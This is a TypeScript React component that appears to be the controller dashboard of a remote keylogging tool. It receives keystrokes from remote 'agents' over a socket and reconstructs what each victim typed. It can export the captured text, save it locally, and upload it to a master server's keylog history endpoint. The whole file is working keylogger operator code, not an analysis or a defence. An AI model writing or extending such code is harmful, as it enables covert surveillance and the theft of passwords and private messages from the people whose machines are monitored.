import { useEffect, useRef, useState } from 'react'
import { dashboardSocket } from '../utils/socket'

import React, { forwardRef, useImperativeHandle } from 'react'

export type KeylogPanelHandle = { exportAndSave: () => Promise<void> }

const KeylogPanel = forwardRef<KeylogPanelHandle, { open: boolean; agentId: string; agentName: string; onClose?: () => void }>(function KeylogPanel({ open, agentId, agentName, onClose }, ref) {
  const [words, setWords] = useState<string[]>([])
  const bufRef = useRef<string>('')
  const timerRef = useRef<number | null>(null)
  // Simulated notepad buffer
  const [typed, setTyped] = useState<string>('')
  const [cursor, setCursor] = useState<number>(0)
  const typedRef = useRef<HTMLDivElement | null>(null)
  const typedStateRef = useRef<string>('')
  const cursorRef = useRef<number>(0)
  // Dedup guard for rapid duplicate events
  const lastRawRef = useRef<string>('')
  const lastTsRef = useRef<number>(0)

  useEffect(() => {
    if (!open) return
    const flush = () => {
      const w = bufRef.current.trim()
      if (w) setWords((prev) => [...prev, w])
      bufRef.current = ''
    }
    const schedule = () => {
      if (timerRef.current) window.clearTimeout(timerRef.current)
      timerRef.current = window.setTimeout(flush, 600)
    }
    const formatKeyToken = (keyNameRaw: string) => {
      const name = (keyNameRaw || '').toLowerCase()
      const base = name.replace(/^key\./, '')
      const simple: Record<string,string> = {
        enter: '⏎ Enter', return: '⏎ Enter', esc: '⎋ Esc', escape: '⎋ Esc',
        tab: '⇥ Tab', space: '␣ Space', backspace: '⌫ Backspace', delete: '⌦ Delete',
        left: '← Left', right: '→ Right', up: '↑ Up', down: '↓ Down',
        home: 'Home', end: 'End', page_up: 'PgUp', page_down: 'PgDn',
        insert: 'Ins', print_screen: 'PrtSc', num_lock: 'NumLock', caps_lock: 'CapsLock',
        shift: 'Shift', shift_l: 'Shift', shift_r: 'Shift',
        ctrl: 'Ctrl', control: 'Ctrl', ctrl_l: 'Ctrl', ctrl_r: 'Ctrl',
        alt: 'Alt', alt_l: 'Alt', alt_r: 'Alt',
        cmd: 'Meta', cmd_l: 'Meta', cmd_r: 'Meta',
        media_play_pause: 'Media Play/Pause', media_volume_up: 'Vol+', media_volume_down: 'Vol-',
      }
      if (simple[base]) return `[${simple[base]}]`
      const f = base.match(/^f(\d{1,2})$/)
      if (f) return `[F${parseInt(f[1],10)}]`
      // Fallback: prettify
      return `[${base.replace(/_/g,' ').replace(/\b\w/g, (m) => m.toUpperCase())}]`
    }

    const onLine = (raw: string) => {
      const s = String(raw || '')
      // Drop immediate exact duplicates (double-emission) within a tight window
      const now = Date.now()
      if (s === lastRawRef.current && (now - lastTsRef.current) < 100) {
        return
      }
      lastRawRef.current = s
      lastTsRef.current = now
      // Handle special keys and update simulated buffer (use refs to avoid stale closures)
      const setTypedAndCursor = (nt: string, nc: number) => {
        typedStateRef.current = nt
        cursorRef.current = Math.max(0, Math.min(nt.length, nc))
        setTyped(nt)
        setCursor(cursorRef.current)
        if (typedRef.current) typedRef.current.scrollTop = typedRef.current.scrollHeight
      }
      const applyInsert = (text: string) => {
        const t = typedStateRef.current
        const c = cursorRef.current
        const nt = t.slice(0, c) + text + t.slice(c)
        setTypedAndCursor(nt, c + text.length)
      }
      const backspace = () => {
        const t = typedStateRef.current
        const c = cursorRef.current
        if (c > 0) {
          const nt = t.slice(0, c - 1) + t.slice(c)
          setTypedAndCursor(nt, c - 1)
        }
      }
      const del = () => {
        const t = typedStateRef.current
        const c = cursorRef.current
        if (c < t.length) {
          const nt = t.slice(0, c) + t.slice(c + 1)
          setTypedAndCursor(nt, c)
        }
      }
      const left = () => setTypedAndCursor(typedStateRef.current, cursorRef.current - 1)
      const right = () => setTypedAndCursor(typedStateRef.current, cursorRef.current + 1)
      const home = () => {
        const t = typedStateRef.current
        let i = cursorRef.current
        while (i > 0 && t[i - 1] !== '\n') i--
        setTypedAndCursor(t, i)
      }
      const end = () => {
        const t = typedStateRef.current
        let i = cursorRef.current
        while (i < t.length && t[i] !== '\n') i++
        setTypedAndCursor(t, i)
      }
      const up = () => {
        const t = typedStateRef.current
        let c = cursorRef.current
        let col = 0, i = c
        while (i>0 && t[i-1] !== '\n') { col++; i-- }
        if (i===0) return
        let j = i-1
        while (j>0 && t[j-1] !== '\n') j--
        const prevLen = (i - j)
        setTypedAndCursor(t, j + Math.min(col, Math.max(0, prevLen-1)))
      }
      const down = () => {
        const t = typedStateRef.current
        let c = cursorRef.current
        let col = 0, i = c
        while (i>0 && t[i-1] !== '\n') { col++; i-- }
        let endCur = c
        while (endCur<t.length && t[endCur] !== '\n') endCur++
        if (endCur>=t.length) return
        let j = endCur+1
        let nextLen = 0
        while (j+nextLen<t.length && t[j+nextLen] !== '\n') nextLen++
        setTypedAndCursor(t, j + Math.min(col, nextLen))
      }

      if (s.startsWith('Key.')) {
        if (timerRef.current) { window.clearTimeout(timerRef.current); timerRef.current = null }
        const base = s.toLowerCase().replace(/^key\./,'')
        switch (base) {
          case 'space': applyInsert(' '); break
          case 'enter': applyInsert('\n'); break
          case 'tab': applyInsert('\t'); break
          case 'backspace': backspace(); break
          case 'delete': del(); break
          case 'left': left(); break
          case 'right': right(); break
          case 'home': home(); break
          case 'end': end(); break
          case 'up': up(); break
          case 'down': down(); break
          default: break // ignore modifiers
        }
        // Also append token to event list for visibility
        const token = formatKeyToken(s)
        const cur = bufRef.current.trim()
        if (cur) { setWords((prev)=>[...prev, cur]); bufRef.current = '' }
        setWords((prev)=>[...prev, token])
        return
      }
      const m = s.match(/^'(.*)'$/)
      const ch = m ? m[1] : s
      if (ch && ch.length >= 1) {
        applyInsert(ch[0])
        bufRef.current += ch[0]
      } else {
        if (timerRef.current) { window.clearTimeout(timerRef.current); timerRef.current = null }
        const cur = bufRef.current.trim(); if (cur) setWords((prev)=>[...prev, cur]); bufRef.current=''
        setWords((prev)=>[...prev, ch])
      }
      schedule()
    }
    dashboardSocket.onKeylog(agentId, onLine)
    return () => {
      if (timerRef.current) window.clearTimeout(timerRef.current)
      dashboardSocket.offKeylog(agentId, onLine)
    }
  }, [agentId, open])

  useEffect(() => {
    typedStateRef.current = typed
    cursorRef.current = cursor
    const el = typedRef.current
    if (el) el.scrollTop = el.scrollHeight
  }, [typed, cursor])

  useImperativeHandle(ref, () => ({
    async exportAndSave() {
      try {
        const text = (typedStateRef.current || '') + '\n\n-- Events --\n' + (words.join('\n')) + '\n'
        // Download
        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' })
        const url = URL.createObjectURL(blob)
        const a = document.createElement('a'); a.href = url; a.download = `keylog-${agentId}-${Date.now()}.txt`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
        // Save local (IndexedDB)
        try { const mod = await import('../utils/keylogs'); await mod.saveKeylog(agentId, agentName, words) } catch {}
        // Save to backend history
        try {
          const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
          const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
          await fetch(`${apiBase}/admin/history/keylog`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ agent_id: agentId, agent_name: agentName, text }) })
        } catch {}
      } catch {}
    }
  }))

  return (
    <div style={{ position: 'fixed', top: 0, right: 0, bottom: 0, width: open ? 420 : 0, background: '#0f0f0f', borderLeft: '1px solid #222', overflow: 'hidden', transition: 'width 0.2s ease', zIndex: 1000 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderBottom: '1px solid #222' }}>
        <div style={{ color: '#9efc9e' }}>Keylog • {agentName}</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          <button className="btn secondary" onClick={() => { setTyped(''); setCursor(0) }}>Reset typed</button>
          <button className="btn secondary" onClick={() => {
            const blob = new Blob([words.join('\n') + '\n'], { type: 'text/plain;charset=utf-8' })
            const url = URL.createObjectURL(blob)
            const a = document.createElement('a'); a.href = url; a.download = `keylog-${agentId}-${Date.now()}.txt`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
          }}>Download</button>
          <button className="btn secondary" onClick={() => { try { import('../utils/keylogs').then(mod => mod.saveKeylog(agentId, agentName, words)); } catch {} }}>Save</button>
          <button className="btn secondary" onClick={() => { setWords([]); bufRef.current=''; }}>Clear events</button>
          <button className="btn" onClick={() => { try { dashboardSocket.stopKeylog(agentId) } catch {}; onClose && onClose() }}>Close</button>
        </div>
      </div>
      <div style={{ padding: 10, display: 'flex', flexDirection: 'column', gap: 10, height: 'calc(100% - 48px)' }}>
        <div style={{ flex: 0, border: '1px solid #222', borderRadius: 6, padding: 8, background: '#0b0b0b' }}>
          <div style={{ color: '#9efc9e', fontSize: 12, marginBottom: 6 }}>Simulated Typed Text</div>
          <div ref={typedRef} style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Consolas, monospace', fontSize: 12, color: '#ddd', whiteSpace: 'pre-wrap', maxHeight: 180, overflowY: 'auto' }}>
            {typed || '(empty)'}
          </div>
        </div>
        <div style={{ flex: 1, minHeight: 0, border: '1px solid #222', borderRadius: 6, padding: 8, background: '#0b0b0b', overflowY: 'auto' }}>
          <div style={{ color: '#9efc9e', fontSize: 12, marginBottom: 6 }}>Events</div>
          {words.length === 0 && (<div style={{ color: '#777' }}>(no events)</div>)}
          {words.map((w, i) => (
            <div key={i} style={{ color: '#bbb', fontSize: 12, wordBreak: 'break-word' }}>{w}</div>
          ))}
        </div>
      </div>
    </div>
  )
})

export default KeylogPanel
